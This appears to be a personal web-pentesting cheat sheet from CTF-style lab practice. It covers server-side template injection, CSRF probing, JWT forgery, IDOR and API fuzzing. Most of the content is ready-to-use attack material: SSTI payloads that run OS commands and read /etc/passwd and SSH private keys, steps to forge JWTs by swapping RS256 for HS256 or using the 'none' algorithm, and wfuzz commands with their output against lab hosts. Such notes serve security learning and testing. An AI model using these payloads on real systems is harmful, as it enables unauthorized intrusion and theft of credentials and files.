# part I

### Server Side Template Injection	SSTI

`{{2+2}} `


https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}} 

{{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}


{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}


{{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/test/.ssh/id_rsa').read() }}
```

tool
https://github.com/epinna/tplmap


### CSRF	Cross Site Request Forgery

user visits a page on a site, that performs an action on a different site

pip3 install xsrfprobe

`xsrfprobe -u <url>/<endpoint>`


### JWT  Json Web Tokens

http://jwt.io

Token breaker in scripts folder 


### using public key


change header to from RS256 to HS256, 

convert public key 
`cat <key> | xxd -p | tr -d "//n"`

openssl sign as valid HS256

```py
echo -n "Key" | openssl dgst -sha256 -mac HMAC -macopt hexkey:<inputFromAbove>
```
decode hex to binary

```py
python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(bin ascii.a2b_hex('<stdin from above>')).replace('=','')\")"
```

### using header none



https://github.com/lmammino/jwt-cracker

`jwt-cracker <token> [alphabet] [max-length]`


# part II


### IDOR


Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. 


playing with url ,,,

Forced Browsing

dirsearch
dirbuster
dirb
ZAP
Burpsuite 

wfuzz

```
000001659:   404        6 L      57 W       553 Ch      "accountants"  
000001661:   404        6 L      57 W       550 Ch      "accounts"     
000001664:   404        6 L      57 W       552 Ch      "acct_login"   
000001669:   404        6 L      57 W       551 Ch      "acerca-de"    
000001667:   404        6 L      57 W       548 Ch      "acdsee" 
```
We can see that when there isn't a note.txt it returns a 404, with 57 words. Let's hide 57 words by setting --hw to 57.

```
─$ wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 57 10.10.113.150:81/FUZZ/note.txt
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.113.150:81/FUZZ/note.txt
Total requests: 20469

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================
000013500:   200        1 L      1 W        20 Ch       "password"  

```


### API bypassing

 This is a bit of a unique one, as it can basically be anything. APIs are by definition incredibly versatile, and finding out how to exploit them, will require a lot of research and effort by the hacker. The following situation is only one possible scenario out of a near infinite number.
 
```bash
 ─$ wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 0 10.10.113.150:82/api.php?FUZZ=flag.txt
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.113.150:82/api.php?FUZZ=flag.txt
Total requests: 20469

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================

000007534:   200        1 L      1 W        15 Ch       "file"                                                                                                 

Total time: 0
Processed Requests: 9596
Filtered Requests: 9595
Requests/sec.: 0

```












